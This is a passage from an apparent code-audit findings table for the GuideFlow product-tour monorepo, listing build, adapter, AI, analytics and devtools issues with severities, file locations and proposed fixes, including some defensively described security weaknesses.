| `cli-export-overwrites-input-and-arbitrary-paths` | P2 | `packages/cli/src/commands/export.ts:59` | guideflow export writes to an unvalidated output path and silently overwrites its own input file for .json inputs | Compute the default output path from the basename rather than a suffix substitution (`src.replace(/\.(ts|js|json)$/, '') + '.flow.json'`) and hard-refuse when the reso… |
| `devtools-overbroad-permissions` | P2 | `packages/devtools/manifest.json:11` | MV3 extension requests <all_urls> host permissions, tabs, and an all-URLs content script, and exposes bridge.js as a web-accessible resource to every site | Drop `"tabs"` (unused — `activeTab` covers every call site). Replace the static `<all_urls>` content script and `host_permissions` with on-demand injection: keep only … |
| `devtools-recording-captures-password-values` | P2 | `packages/devtools/src/content/inspector.ts:187` | DevTools recording mode captures raw input values, including password fields, into chrome.storage | Do not capture values for sensitive fields, and prefer not capturing them at all: in `onRecordInput`, skip when `target.type` is one of `password|email|tel|hidden` or … |
| `release-no-provenance-no-audit` | P2 | `.github/workflows/release.yml:44` | Publish workflow has no npm provenance, no dependency audit, and no Dependabot/CodeQL; NPM_TOKEN is exposed to the whole build+publish step | Add `id-token: write` to the release job's `permissions` and change `publish-packages` to `changeset publish --provenance`. Split the workflow so the build step runs w… |
| `unescaped-i18n-strings-in-popover` | P2 | `packages/core/src/renderer/default-renderer.ts:175` | All i18n strings are interpolated into innerHTML unescaped, including inside an aria-label attribute | Apply `this._esc()` to all three sinks: the `close` aria-label, the `stepOf` span body, and the `skip` button body. Also escape the substituted variables inside `I18nR… |
| `webhook-headers-option-nonexistent` | P2 | `apps/docs/api/analytics/transports.md:80` | Documented WebhookTransport `headers` option does not exist — the Authorization header from the docs example is silently dropped | Add `headers?: Record<string, string>` to `WebhookTransportOptions` and merge it in `flush()` (`const headers = { 'Content-Type': 'application/json', ...this.opts.head… |
| `webhook-sendbeacon-documented-not-implemented` | P2 | `packages/analytics/src/transports/webhook.ts:19` | WebhookTransport documents a sendBeacon unload fallback that does not exist; the beforeunload flush is a fire-and-forget async fetch | Implement the documented behaviour: in the unload handler, when the queue is non-empty and `navigator.sendBeacon` exists, send the batch as a `Blob` with type `applica… |
| `cli-studio-unauthenticated-arbitrary-root` | P3 | `packages/cli/src/commands/studio.ts:16` | guideflow studio starts an unauthenticated Vite dev server rooted at an arbitrary user-supplied directory | Reject roots outside the project: resolve `opts.root` and require that it be inside `process.cwd()`, or at minimum refuse `/` and the user's home directory. Pin the bi… |
| `devtools-bridge-postmessage-wildcard-exfiltration` | P3 | `packages/devtools/src/bridge.ts:108` | Bridge broadcasts every tour event to the page with postMessage(msg, "*"), letting any third-party script on the page read all tour data | Stop using the shared page message bus. Create the channel once during injection: in inspector.ts, construct a `MessageChannel` and transfer `port2` to the bridge in a… |
| `intro-compat-attribute-tour-injection` | P3 | `packages/core/src/compat/intro-compat.ts:137` | watchAttributeTour auto-adopts data-gf-* attributes from dynamically injected DOM, turning HTML-attribute injection into branded in-app phishing | Scope the observer: make the `root` parameter required rather than defaulting to `document.body`, so an integrator must opt a specific trusted container in. Add an `al… |
| `packages-ship-src-directory` | P3 | `packages/core/package.json:56` | Every published package ships its src/ directory, disclosing source and doubling install size | Remove `"src"` from the `files` array in packages/{core,react,vue,svelte,ai,analytics,cli}/package.json, leaving `["dist", "README.md"]`. Enable `sourcemap: true` in e… |

#### build (30)

| id | sev | file | issue | fix |
|---|---|---|---|---|
| `adapters-bundle-core-as-hard-dependency` | P2 | `packages/react/package.json:57` | ai/react/svelte/vue declare @guideflow/core as a runtime `dependency`, allowing two copies of core and breaking its instanceof check | In packages/{ai,react,svelte,vue}/package.json move `@guideflow/core` out of `dependencies` into `peerDependencies` as `"@guideflow/core": "workspace:^"` and add it to… |
| `analytics-workspace-protocol-in-peerdeps` | P2 | `packages/analytics/package.json:58` | @guideflow/analytics lists @guideflow/core in peerDependencies as `workspace:*`, which publishes as an exact-version peer pin | Change packages/analytics/package.json:59 to `"@guideflow/core": "workspace:^"` so it publishes as `^0.1.9`, and keep line 62's devDependencies entry as `"workspace:*"… |
| `apps-e2e-has-no-tsconfig` | P2 | `apps/e2e/package.json:10` | apps/e2e has no tsconfig.json, no @types/node and no window.__guideflow declaration — the suite can never be type-checked | Add apps/e2e/tsconfig.json extending ../../tsconfig.base.json with `"types": ["node"]` and `"include": ["tests", "playwright.config.ts", "types"]`, add `@types/node` t… |
| `ci-has-no-e2e-size-coverage-or-changeset-gate` | P2 | `.github/workflows/ci.yml:35` | CI runs one Node version, excludes all apps, and never runs e2e, size-limit, coverage or a changeset-presence check; the Turbo cache is not persisted | In .github/workflows/ci.yml add `strategy.matrix.node: [18, 20, 22]` to the ci job; add an `actions/cache` step keyed on `${{ runner.os }}-turbo-${{ github.sha }}` wit… |
| `clean-scripts-rm-rf-posix-only` | P2 | `package.json:14` | Every clean script (and the root clean) uses POSIX `rm -rf`, which fails on the maintainer's Windows machine | Add `rimraf` to root devDependencies and replace every `rm -rf X Y` with `rimraf X Y`. For the root script use `turbo run clean && rimraf node_modules "packages/*/node… |
| `cli-no-test-script` | P2 | `packages/cli/package.json:44` | packages/cli has no test script at all — the whole CLI surface is untested and unverified | Add `vitest` to packages/cli devDependencies, a `"test": "vitest run"` script, and `packages/cli/src/__tests__/` covering: `export` round-tripping a real `.json` flow,… |
| `cli-ships-vite-as-runtime-dependency` | P2 | `packages/cli/package.json:56` | packages/cli puts vite in `dependencies` for one command, forcing every CLI install to download Vite and its esbuild binary | Move `vite` from `dependencies` to `optionalDependencies` (or `peerDependenciesMeta.optional`) in packages/cli/package.json:56, and change packages/cli/src/commands/st… |
| `core-build-cp-posix-only` | P2 | `packages/core/package.json:57` | @guideflow/core build uses POSIX `cp -r`; on Windows the ./styles export subpath is never produced | Add `cpy-cli` (or a tiny `scripts/copy-styles.mjs` using `node:fs` `cpSync(src, dest, { recursive: true })`) to packages/core devDependencies and change the script to … |
| `core-iife-build-is-unreachable` | P2 | `packages/core/tsup.config.ts:5` | core builds an IIFE bundle for CDN use but declares no unpkg/jsdelivr/browser field, so script-tag users get the CJS file | Add `"unpkg": "./dist/index.global.js"`, `"jsdelivr": "./dist/index.global.js"` and an `"./global": "./dist/index.global.js"` export subpath to packages/core/package.j… |
| `core-styles-export-missing-default` | P2 | `packages/core/package.json:41` | The "./styles" and "./styles/*" export subpaths declare only an `import` condition, so non-ESM resolvers get ERR_PACKAGE_PATH_NOT_EXPORTED | In packages/core/package.json:41-46 give both subpaths a terminal fallback and a style condition: `"./styles": { "style": "./dist/styles/index.css", "default": "./dist… |
| `demo-app-never-linted` | P2 | `apps/demo/package.json:6` | apps/demo ships an .eslintrc.json but no lint script, and CI excludes it from type-check — its only gate is the docs deploy | Add `"lint": "eslint src --max-warnings 0"` to apps/demo/package.json:6-11, stop excluding `@guideflow/demo` from the type-check and lint steps in .github/workflows/ci… |
| `exports-never-reference-emitted-dcts` | P2 | `packages/core/package.json:35` | Every dual-format package emits dist/index.d.cts but no `exports` map references it, so CJS consumers get ESM-flavoured types | Replace the flat condition object in packages/{core,ai,analytics,react,svelte,vue}/package.json with nested per-condition types: `".": { "import": { "types": "./dist/i… |
| `missing-repo-hygiene-files` | P2 | `.github/workflows/ci.yml:1` | No CONTRIBUTING, CODE_OF_CONDUCT, SECURITY, .nvmrc, .editorconfig, issue/PR templates, CHANGELOG or npm provenance | Add SECURITY.md, CONTRIBUTING.md, CODE_OF_CONDUCT.md, .nvmrc (`22`), .editorconfig, .github/ISSUE_TEMPLATE/{bug_report.yml,feature_request.yml}, .github/pull_request_t… |
| `published-packages-have-no-license-file` | P2 | `packages/core/package.json:51` | No package ships a LICENSE file — `files` omits it and no per-package LICENSE exists | Add `"LICENSE"` to the `files` array in all seven manifests and copy the root LICENSE into each package directory — either by committing seven copies, or (cleaner) by … |
| `root-test-e2e-script-matches-nothing` | P2 | `package.json:10` | `pnpm test:e2e` is a silent no-op — apps/e2e defines `test`, not `test:e2e` | Rename apps/e2e/package.json:6 from `"test"` to `"test:e2e": "playwright test"` (and `test:ui`/`test:headed` to `test:e2e:ui`/`test:e2e:headed`). That makes the root `… |
| `size-budget-unenforced-and-optimistic` | P2 | `packages/core/package.json:75` | The 12 kB core size budget is never run in CI, and the actual unminified shipped file gzips to 14.9 kB | Add a `pnpm turbo run size` step to .github/workflows/ci.yml, and make the budget measure reality: either set `minify: true` in packages/core/tsup.config.ts:12, or add… |
| `studio-script-cannot-resolve-bin` | P2 | `package.json:22` | Root `pnpm studio` fails — the `guideflow` bin is not linked into any node_modules/.bin | Change package.json:22 to `"studio": "pnpm --filter @guideflow/cli run build && node packages/cli/dist/index.js studio"`, or add `"guideflow": "workspace:*"`-style sel… |
| `svelte-cjs-build-cannot-run` | P2 | `packages/svelte/dist/index.cjs:1` | @guideflow/svelte's CJS build calls require('svelte/store'), which throws ERR_REQUIRE_ESM — the advertised `require` entry point is dead | Drop `cjs` from `format` in packages/svelte/tsup.config.ts:5 (make it `format: ['esm']`), remove `"require": "./dist/index.cjs"` and `"main": "./dist/index.cjs"` from … |
| `turbo-globaldeps-omit-shared-config` | P2 | `turbo.json:3` | turbo.json's globalDependencies omit tsconfig.base.json, .eslintrc.json and pnpm-lock.yaml, so shared-config edits return stale cached successes | Change turbo.json:3 to `"globalDependencies": ["**/.env.*local", "tsconfig.base.json", ".eslintrc.json", ".prettierrc.json", "pnpm-lock.yaml", "package.json"]`. |
| `turbo-lint-missing-dependson-build` | P2 | `turbo.json:23` | turbo's `lint` task has no dependsOn, so `pnpm lint` on a fresh clone fails — type-aware ESLint needs dependency .d.ts files | Add `"dependsOn": ["^build"]` to the `lint` task in turbo.json:23-25, matching what `test` (line 14) and `type-check` (line 27) already declare. |
| `vue-dead-test-config` | P2 | `packages/vue/package.json:53` | packages/vue ships a test script, vitest and @vue/test-utils but has no tests and no vitest config — a fabricated green test run | Either write the tests — add packages/vue/vitest.config.ts (environment `happy-dom`, mirroring packages/react/vitest.config.ts) plus `packages/vue/src/__tests__/use-to… |
| `cli-exports-lacks-types-and-default` | P3 | `packages/cli/package.json:34` | @guideflow/cli publishes an exports map with no `types` and no `default`, so importing it programmatically is untyped and require() throws | Set `dts: true` in packages/cli/tsup.config.ts:6, export `PushOptions` (and the command types) from packages/cli/src/index.ts, and change packages/cli/package.json:34-… |
| `devtools-content-script-emitted-as-esm` | P3 | `packages/devtools/vite.config.ts:89` | devtools' Vite config never pins an output format, so the content script is emitted as ESM — one added import breaks extension loading | Split the extension build: keep the HTML/panel/popup entries in the ES-format build, and add a second Vite/rollup pass (or a `build.rollupOptions.output` array) that e… |
| `devtools-manifest-version-drift` | P3 | `packages/devtools/manifest.json:4` | devtools is private and changeset-ignored, yet manifest.json hardcodes a version that nothing keeps in sync with package.json | Drop `"@guideflow/devtools"` from the .changeset/config.json:10 ignore array (it is already covered by `private: true`) and make the version single-sourced: delete `"v… |
| `orphaned-hand-written-docs-site` | P3 | `.github/workflows/docs.yml:6` | A second hand-written HTML docs site is tracked at docs/ and watched by docs.yml, but is never built or deployed | Decide on one source of truth: delete the docs/ directory and remove `'docs/**'` from .github/workflows/docs.yml:9, or, if those pages carry content missing from ViteP… |
| `prettier-config-contradicts-half-the-codebase` | P3 | `.prettierrc.json:2` | Prettier is configured with semi:false but half the source uses semicolons, and no script or CI step ever runs it | Add `"format": "prettier --write ."` and `"format:check": "prettier --check ."` to the root package.json scripts, run `pnpm format` once as a single isolated commit, t… |
| `storybook-test-runner-not-installed` | P3 | `apps/storybook/package.json:8` | apps/storybook's `test-storybook` script calls a binary that is not a dependency | Either add `"@storybook/test-runner": "^0.19.0"` to apps/storybook devDependencies and rename the script to `"test": "test-storybook"` so turbo picks it up (plus a CI … |
| `svelte-vue-descriptions-promise-components` | P3 | `packages/svelte/package.json:4` | packages/svelte and packages/vue advertise "components" in their npm descriptions but ship none | Change packages/svelte/package.json:4 to "GuideFlow Svelte adapter — reactive tour stores" and packages/vue/package.json:4 to "GuideFlow Vue 3 adapter — plugin and com… |
| `sync-script-breaks-on-declared-node-18` | P3 | `scripts/sync-repo-meta.mjs:13` | scripts/sync-repo-meta.mjs uses import.meta.dirname, which is undefined on Node 18 — below the repo's own engines floor | Replace scripts/sync-repo-meta.mjs:13 with the portable form: `import { fileURLToPath } from 'node:url'; const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), … |
| `turbo-v1-pipeline-no-inputs-no-env` | P3 | `turbo.json:4` | turbo.json is Turbo-1.x-only (`pipeline`) and declares no `inputs` and no `env`/`globalEnv`, giving over-broad and env-blind cache keys | Run `npx @turbo/codemod migrate` to rename `pipeline`→`tasks` and bump root package.json:38 to `"turbo": "^2"`. Add `"inputs": ["src/**", "tsup.config.ts", "package.js… |

#### adapters (20)

| id | sev | file | issue | fix |
|---|---|---|---|---|
| `adapters-no-hints-progress-i18n-listflows-surface` | P2 | `packages/svelte/src/index.ts:21` | hints, progress, i18n, listFlows, configure, currentStep and currentContent are exposed by no adapter in any framework | Add `currentStep` and `currentContent` to all three adapters' state (they are already refreshed on the same `step:enter` event that drives the existing scalars — one e… |
| `adapters-no-pause-resume-anywhere` | P2 | `packages/react/src/hooks/use-tour.ts:17` | pause/resume exist on GuideFlowInstance but no adapter surfaces them, and core exposes no isPaused getter to render against | Add `get isPaused(): boolean` to TourEngine and to the `GuideFlowInstance` interface, then add `pause`/`resume`/`isPaused` to all three adapters' return shapes (React … |
| `cli-init-vue-svelte-scaffolds-nothing` | P2 | `packages/cli/src/commands/init.ts:98` | `guideflow init --framework vue|svelte` accepts the flag, tells the user to install the adapter, and scaffolds no adapter wiring | Add `VUE_TEMPLATE` (a `main.ts` snippet with `app.use(GuideFlowPlugin, { instance: gf })`) and `SVELTE_TEMPLATE` (a `+layout.svelte` / `tour.ts` with `createTourStore`… |
| `conversationalpanel-no-abort-swallowed-error-dead-highlights` | P2 | `packages/react/src/components/ConversationalPanel.tsx:88` | ConversationalPanel cannot abort in-flight AI requests, swallows the error object entirely, and stores highlights it never renders | Add an `AbortSignal` parameter to `GuideBrain.chat()` and thread it from an `AbortController` held in a ref, aborting in an unmount cleanup and before each new submit.… |
| `demo-dead-push-ui-and-false-transport-count` | P2 | `apps/demo/src/App.tsx:876` | apps/demo's CLI "push" panel is a non-functional form with a password field, and the analytics panel hardcodes "3 transports" when dev registers 2 | Derive the transport badges from the collector (expose a `transports` getter on `AnalyticsCollector` and map over it) so the count is always true. For the push panel, … |
| `missing-adapters-angular-solid-preact-nuxt-webcomponent` | P2 | `apps/docs/guide/index.md:36` | No Angular, Solid, Preact, or web-component adapter, no Nuxt module, and no SvelteKit/Next.js integration package | Ship the cheapest high-leverage ones first: (1) a `<guideflow-tour>` custom element in core (or `@guideflow/wc`) — it unblocks Angular, Solid, Preact, htmx and plain H… |
| `react-no-usesyncexternalstore-tearing` | P2 | `packages/react/src/hooks/use-tour.ts:41` | All React subscriptions read mutable engine state during render with plain useState — no useSyncExternalStore, so concurrent rendering can tear | Rewrite `useTour` on `useSyncExternalStore(subscribe, getSnapshot, getServerSnapshot)` with a memoised snapshot (cache the object and return the previous reference whe… |
| `react-provider-ignores-config-changes` | P2 | `packages/react/src/context.tsx:28` | TourProvider snapshots `config` into a ref on first render and never applies later changes | Add `useEffect(() => { if (!instance && config) gf.configure(config) }, [gf, instance, config])`, and document in TourProviderProps that `config` is applied via `confi… |
| `react-provider-usememo-not-a-cache-guarantee` | P2 | `packages/react/src/context.tsx:29` | TourProvider constructs the stateful engine inside useMemo, which React is documented to be allowed to discard | Replace `useMemo` with a lazy `useState` initializer (`const [gf] = useState(() => instance ?? createGuideFlow(configRef.current ?? {}))`) — state is a semantic guaran… |
| `react-tests-mock-only-half-the-surface-untested` | P2 | `packages/react/src/__tests__/react.test.tsx:16` | React tests cover 4 of 9 exports and only against a hand-written mock; GuidePopover, HotspotBeacon, ConversationalPanel and useHotspot have zero tests | Add tests that render `<GuidePopover>` against a real `createGuideFlow({ renderer: nullRenderer })` and assert exactly one `[role=dialog]` exists in the document; a `u… |
| `react-types-pinned-to-18-peer-claims-19` | P2 | `packages/react/package.json:67` | React 19 is in the peer range but @types/react is pinned to ^18, and UseTourStepReturn's RefObject<T> is incompatible with React 19's useRef typing | Add a CI matrix that installs react/@types/react at 17, 18 and 19 and runs `pnpm --filter @guideflow/react type-check` for each. Change the public type to `ref: RefObj… |
| `react-usehotspot-returns-null-id` | P2 | `packages/react/src/hooks/use-tour-step.ts:97` | useHotspot's returned `id` is always null — it reads a ref that is only assigned after render | Hold the id in `useState<string | null>(null)` and `setId(...)` inside the effect (clearing it in cleanup), so the value actually reaches the consumer on a subsequent … |
| `react-usehotspot-silent-noop-on-null-ref` | P2 | `packages/react/src/hooks/use-tour-step.ts:83` | useHotspot silently does nothing when the ref is not yet attached, and never retries | Accept an optional `enabled`/`deps` argument, or switch the public signature to a callback ref so attachment drives creation; at minimum `console.warn` when `targetRef… |
| `storybook-theme-stories-identical` | P2 | `apps/storybook/stories/TourFlow.stories.tsx:74` | The three Storybook "Theme*" stories are byte-identical to Default — createGuideFlow() takes no theme — and construct an engine inside render() | Either delete the three fake theme stories or make them real by importing the theme stylesheets that already exist (packages/core/src/styles/themes.css) and setting a … |
| `vue-globalproperties-no-type-augmentation` | P2 | `packages/vue/src/plugin.ts:21` | this.$guideflow is documented for the Options API but the plugin adds no ComponentCustomProperties augmentation | Add the `ComponentCustomProperties` module augmentation to packages/vue/src/plugin.ts (it ships in the .d.ts via tsup's dts build) and drop the `Record<string, unknown… |
| `vue-onunmounted-instead-of-onscopedispose` | P2 | `packages/vue/src/composables/use-tour.ts:59` | Vue useTour cleans up with onUnmounted, so listeners leak permanently when used outside a component instance | Replace `onUnmounted` with `onScopeDispose` from 'vue' (it fires for component scopes too, so there is no behavioural regression), and add a Vue test that calls `useTo… |
| `demo-literal-unicode-escapes-rendered` | P3 | `apps/demo/src/App.tsx:886` | apps/demo renders the literal text … in two places — JSX text does not process backslash escapes | Replace with `{'Start a tour to see events here…'}` (wrap in braces so it is a JS expression) or just type the literal `…` character, in both apps/demo/src/App.tsx:886… |
| `docs-missing-api-pages-for-half-the-react-surface` | P3 | `apps/docs/packages/react.md:29` | apps/docs/packages/react.md links nine exports but only four have API pages, and the two hook descriptions it gives are wrong | Fix the two hook descriptions in apps/docs/packages/react.md:28-29 and packages/react/README.md, and add reference pages for the five undocumented React exports. Since… |
| `no-iife-build-for-adapters-and-unreachable-core-iife` | P3 | `packages/react/tsup.config.ts:5` | No adapter emits an IIFE/UMD bundle, and core's IIFE build is not reachable through its exports map or any CDN field | Add `"unpkg": "./dist/index.global.js"` and `"jsdelivr": "./dist/index.global.js"` to packages/core/package.json plus a `"./global"` export condition, and document the… |
| `react-usetour-flowid-param-does-not-scope` | P3 | `packages/react/src/hooks/use-tour.ts:38` | useTour(flowId) implies scoping but only sets a start() default — state and events are global to the instance | Rename the parameter to `defaultFlowId` in all three adapters, or genuinely scope the hook by comparing the event payload's `flowId` and only syncing when it matches. … |

#### ai (14)

| id | sev | file | issue | fix |
|---|---|---|---|---|
| `compress-dead-progress-branch` | P2 | `packages/ai/src/brain.ts:223` | compress()'s persistence check is dead code — nothing ever writes a `step:`-prefixed progress key | Decide the contract and make it real. If per-step completion is wanted, add `markStepCompleted`/`isStepCompleted` to `ProgressStore` (or emit on `step:exit` in core) s… |
| `docs-generate-options-crashes` | P2 | `apps/docs/guide/ai-generate.md:55` | The documented generate() options object is passed to serializeDOM as a root element and throws | Delete the "Custom Generation Options" section, or implement it: change the signature to `generate(prompt?: string, options?: { root?: Element | null; maxSteps?: numbe… |
| `docs-guide-ai-broken-api` | P2 | `apps/docs/guide/ai.md:54` | apps/docs/guide/ai.md and ai-intent.md document IntentSignal and GuidedAnswer fields that do not exist | Fix the four snippets to the real shapes: `signal.type === 'confused'` (as ai-intent.md:26 already does correctly), `answer.text`, `answer.highlights[0]`. Delete the f… |
| `docs-guide-brain-phantom-api` | P2 | `apps/docs/api/ai/guide-brain.md:68` | apps/docs/api/ai/guide-brain.md documents a stopWatch() method that does not exist and gets three signatures wrong | Rewrite the page against the real class: document `watch(): () => void` returning a cleanup, delete the `stopWatch()` section (or add the method to brain.ts as an alia… |
| `docs-providers-phantom-options` | P2 | `apps/docs/api/ai/providers.md:26` | apps/docs/api/ai/providers.md documents baseURL options, wrong defaults, and a custom-provider interface that does not match AIProvider | Regenerate this page from the source types. Either add a real `baseURL` passthrough to the OpenAI/Anthropic constructors (worth doing regardless — see `api-keys-shippe… |
| `dom-context-pii-exfiltration` | P2 | `packages/ai/src/dom-context.ts:155` | serializeDOM ships the full page URL and all visible labels to a third-party LLM with no redaction hook | Add options to `serializeDOM` and `GuideBrainOptions`: `includeUrl?: boolean | 'origin-and-path'` (default to stripping search/hash — `url.origin + url.pathname` cover… |
| `gf-ai-does-not-typecheck` | P2 | `packages/ai/src/index.ts:66` | `gf.ai` does not exist on GuideFlowInstance — every documented example fails type-check | Add an optional `ai?: unknown` (or a structurally-typed `ai?: GuideBrainLike`) to `GuideFlowInstance` in packages/core/src/types, or use TypeScript assertion-function … |
| `provider-no-timeout-abort` | P2 | `packages/ai/src/providers/ollama.ts:33` | No provider supports timeouts, abort signals, or cancellation; Ollama has no resilience at all | Add `timeoutMs?: number` and `signal?: AbortSignal` to all four provider option types and thread them through: `AbortSignal.timeout(ms)` on the Ollama `fetch`, and the… |
| `serializedom-cap-and-visibility` | P2 | `packages/ai/src/dom-context.ts:129` | serializeDOM caps at the first 80 elements in document order and marks offscreen/hidden elements visible | Sort before capping: rank by `interactive`, then by intersection with the viewport (`rect.top < innerHeight && rect.bottom > 0`), then by document order, and slice aft… |
| `userevent-union-dead-members` | P2 | `packages/core/src/types/index.ts:271` | Three of seven UserEvent types are never produced, including the rage-click the type union advertises | Implement `rage-click` in `watch()`: track the last N clicks with timestamps and shallow selectors, and push a synthetic `{type: 'rage-click', target, meta: {count}}` … |
| `validatesteps-drops-step-fields` | P2 | `packages/ai/src/validation.ts:29` | validateSteps silently discards 7 of the 11 Step fields, including actions, media and showIf | Either (a) make the omission explicit and intentional — rename to `validateGeneratedSteps`, document in the JSDoc at validation.ts:9-11 exactly which fields survive an… |
| `css-escape-in-attribute-values` | P3 | `packages/ai/src/dom-context.ts:18` | CSS.escape is used for attribute string values, where identifier escaping is not the correct encoding | Escape for string context instead: `const q = (v: string) => `"${v.replace(/[\\"]/g, '\\$&')}"`` and build `[name=${q(name)}]`. Keep `CSS.escape` for the id strategy a… |
| `stale-model-defaults` | P3 | `packages/ai/src/providers/openai.ts:37` | OpenAI and Ollama defaults are ~2-year-old models with no reference to any current generation | Bump the OpenAI and Ollama defaults to current models, add a "Choosing a model" section to apps/docs/api/ai/providers.md listing current options per provider with a ro… |
| `watch-cleanup-accumulation` | P3 | `packages/ai/src/brain.ts:127` | Repeated watch()/cleanup cycles leak cleanup closures and the second watch() returns a no-op cleanup | Make the cleanup idempotent and self-removing: capture the closure, and inside it splice itself out of `this.cleanups` and guard against double-invocation. For repeate… |

#### analytics (17)

| id | sev | file | issue | fix |
|---|---|---|---|---|
| `async-transport-rejection-unhandled` | P2 | `packages/analytics/src/collector.ts:113` | The collector's try/catch cannot catch async transport failures — `void t.track()` produces unhandled rejections | Handle both shapes: `const r = t.track(payload); if (r && typeof (r as Promise<void>).catch === 'function') (r as Promise<void>).catch(e => console.warn(...))`, keepin… |
| `attach-guard-blocks-reattach` | P2 | `packages/analytics/src/collector.ts:57` | attach() silently refuses to bind to a new instance after the old one is destroyed, killing all analytics | Track the attached instance (`private target: GuideFlowInstance | null`). If `attach()` is called with a different instance, `detach()` first and re-subscribe; if call… |
| `collector-flush-lifecycle-false-promise` | P2 | `packages/analytics/src/collector.ts:96` | flush() swallows all transport errors and is never called on unload despite the interface promising it is | Inspect the `allSettled` results and `console.warn` per rejected transport; consider returning a `{flushed, failed}` summary. Correct the `interface.ts` comment to sta… |
| `docs-overclaim-dropoffs-and-ab-integration` | P2 | `apps/docs/guide/index.md:17` | Marketing copy claims drop-off tracking and A/B integration with PostHog/Mixpanel/Amplitude; neither exists | Downgrade both claims to what ships: "forwards tour lifecycle events to your existing analytics stack" and "deterministic client-side variant assignment (bring your ow… |
| `docs-webhook-headers-option` | P2 | `apps/docs/api/analytics/transports.md:83` | Transports reference documents a `headers` option that does not exist and omits every option that does | Rewrite the option table to match `WebhookTransportOptions` (all five fields with defaults) and add the missing `headers?: Record<string, string>` to the implementatio… |
| `empty-userid-and-zero-weights` | P2 | `packages/analytics/src/experiments.ts:69` | Empty userId buckets all anonymous traffic into one variant, and all-zero weights produce a NaN bucket | Throw (or `console.error` and return a documented null result) when `userId` is empty, and expose a `createAnonymousId()` helper that persists a UUID to localStorage. … |
| `global-window-augmentation-leak` | P2 | `packages/analytics/src/transports/posthog.ts:3` | Four unconditional `declare global` Window augmentations are emitted into the published .d.ts and collide with real SDK types | Stop augmenting the global scope. Read the globals through a locally typed accessor instead: `const ph = (globalThis as { posthog?: { capture(...): void } }).posthog`.… |
| `goto-and-pause-corrupt-step-metrics` | P2 | `packages/core/src/engine/tour.ts:135` | goTo() emits no step:exit and resume() re-emits step:enter, so dwell time is lost and step views are double-counted | Call `this._emitStepExit()` at the top of `goTo()` and in `pause()`. In the collector, dedupe re-entry: keep `{stepId, startedAt}` and, when a `step:enter` arrives for… |
| `no-experiment-persistence-or-exposure` | P2 | `packages/analytics/src/experiments.ts:54` | Experiment assignments are recomputed rather than persisted and never emit an exposure event | Persist assignments to localStorage keyed `gf:exp:<experimentId>` with the variant id and a definition hash; on definition change keep the stored variant and emit `gui… |
| `provider-identity-not-propagated` | P2 | `packages/analytics/src/transports/posthog.ts:20` | No transport propagates userId to the provider's identity field, so tour events attach to anonymous device ids | Add an optional `identify(userId, traits?)` to `AnalyticsTransport` and `AnalyticsCollector.identify()`/`setUserId()`, and implement it per provider (`posthog.identify… |
| `provider-timestamp-format-wrong` | P2 | `packages/analytics/src/transports/mixpanel.ts:17` | Mixpanel and Amplitude transports pass an ISO-8601 string in `time`, where both SDKs expect a numeric epoch | Widen each declared global signature to include the SDK's third options argument and pass the timestamp there (`mixpanel.track(name, props, {}, cb)` is not the path — … |
| `retry-counter-global-not-per-batch` | P2 | `packages/analytics/src/transports/webhook.ts:78` | The failure counter is global, not per-batch, so a fresh batch can be dropped on its very first attempt | Attach a per-batch `attempts` counter (wrap events in `{event, attempts}` or keep a parallel batch object) and drop only that batch when it exceeds `maxRetries`. Use `… |
| `transport-test-coverage-gap` | P2 | `packages/analytics/package.json:53` | Four of five transports have zero tests, and one existing test asserts nothing | Add a `transports.test.ts` that stubs and un-stubs each window global and asserts both the delivered payload shape and the silent-drop path. Rewrite the destroy test w… |
| `transports-silent-noop` | P2 | `packages/analytics/src/transports/posthog.ts:19` | All four SDK transports silently discard every event when the window global is absent — no warning, no buffering | Give each transport a bounded ring buffer (e.g. 50 events) used while the global is absent, drained on the next successful `track()` and on `flush()`. Emit one `consol… |
| `webhook-destroy-not-in-interface` | P2 | `packages/analytics/src/transports/webhook.ts:95` | WebhookTransport.destroy() is outside the AnalyticsTransport interface, so the collector never calls it and leaks a timer plus a beforeunload listener | Add `destroy?(): void | Promise<void>` to `AnalyticsTransport`, add `AnalyticsCollector.destroy()` that detaches, awaits `flush()`, then awaits `destroy()` on every tr… |
| `apikey-in-browser-bundle` | P3 | `packages/analytics/src/transports/webhook.ts:67` | WebhookTransport's apiKey ships a bearer token in client-side JavaScript with no warning | Document loudly in the option JSDoc and in apps/docs/api/analytics/transports.md that `apiKey` is public and must be a write-only, rate-limited, revocable ingest key s… |
| `no-server-or-first-party-sinks` | P3 | `packages/analytics/src/index.ts:50` | No server-side transport, self-hosted sink, GA4, or Rudderstack — despite docs positioning the package for data warehouses | Ship a `GA4Transport` (`window.gtag('event', name, params)` with GA4's 40-char/snake_case name constraints applied) and a `ServerTransport` for Node with header-based … |

#### devtools (32)

| id | sev | file | issue | fix |
|---|---|---|---|---|
| `autorecord-setting-unused` | P2 | `packages/devtools/src/panel/app.tsx:976` | "Auto-record on inspect" setting is stored and rendered but never read by any logic | Either implement it (have `App` own the inspect toggle and fire `GF_START_RECORDING` alongside `GF_START_INSPECT` when `autoRecord` is true) or delete the card. Shippi… |
| `clear-all-data-wipes-settings` | P2 | `packages/devtools/src/panel/app.tsx:1127` | "Clear All Data" calls storage.clear() — wiping settings too — with no confirmation dialog | Enumerate keys and remove only `gf_flow_*`: `chrome.storage.local.get(null, items => chrome.storage.local.remove(Object.keys(items).filter(k => k.startsWith('gf_flow_'… |
| `debug-toggle-has-no-handler` | P2 | `packages/devtools/src/panel/app.tsx:1083` | Settings "Debug Mode" sends GF_SET_DEBUG, which no code in the extension handles | Add a `GF_SET_DEBUG` case in inspector.ts that forwards to the bridge, and a bridge case that calls a core API to flip debug (core currently exposes no runtime debug s… |
| `docs-claim-ai-assist` | P2 | `apps/docs/packages/index.md:36` | Docs advertise AI-assisted tour authoring in the extension; there is no AI code in the package | Remove "AI assist"/"AI-assisted tour authoring" from apps/docs/packages/index.md:36, apps/docs/index.md:45, and apps/docs/packages/devtools.md:2, and change "Chrome/Fi… |
| `double-start-recording-orphans-badge` | P2 | `packages/devtools/src/content/inspector.ts:193` | startRecording unconditionally creates and appends a new badge, leaking the previous one into the page DOM | Guard `startRecording` with `if (recordingMode) return;`, and have `startRecording` first remove any existing `#__gf_recording_badge__` via `document.getElementById(..… |
| `export-json-wrong-shape` | P2 | `packages/devtools/src/panel/app.tsx:455` | Export writes StepDraft[] under a `steps` key, not a FlowDefinition — the exported file cannot be fed to GuideFlow | Extract the flow-construction logic from `runTour` into a `buildFlowDefinition(steps, flowName)` helper and use it for `exportJSON`, `saveTour`, and `exportAllTours`. … |
